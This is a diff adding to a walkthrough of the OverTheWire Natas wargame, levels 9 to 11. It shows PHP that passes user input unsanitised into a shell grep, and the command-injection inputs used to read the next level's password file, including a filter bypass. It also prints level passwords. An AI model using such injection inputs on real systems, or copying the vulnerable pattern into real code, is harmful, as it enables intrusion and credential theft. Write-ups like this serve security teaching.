@@ -189,7 +189,80 @@ Entering this secret into the field revealed the password for the level 9
 
 ```
 Username:         natas9
-Next Password:    
+Next Password:    t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
 URL:              http://natas9.natas.labs.overthewire.org
 ```
 
+Another small application. This one directly inserts the user provided input into php without any sanitisation.
+
+```javascript
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+```
+
+We can abuse this by test; pwd and get the following output
+
+```
+/var/www/natas/natas9
+```
+
+Using the hint from level 7 I used the following command to get the next password
+
+```
+test; cat /etc/natas_webpass/natas10
+```
+
+#### Natas Level 9 → Level 10 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
+
+```
+Username:         natas10
+Next Password:    UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+URL:              http://natas10.natas.labs.overthewire.org
+```
+
+Same deal as before, except now certain characters are considered illegal.\
+This match is far to limited and overall not very effective a simple dot can bypass it completely.
+
+```javascript
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+```
+
+The following input revealed the next password
+
+```
+. /etc/natas_webpass/natas11
+```
+
+#### Natas Level 10 → Level 11 <a href="#natas-level-8-level-9" id="natas-level-8-level-9"></a>
+
+```
+Username:         natas11
+Next Password:    
+URL:              http://natas11.natas.labs.overthewire.org
+```
+
+Now we are show a hint that **Cookies are protected with XOR encryption** and a field to change the background colour.
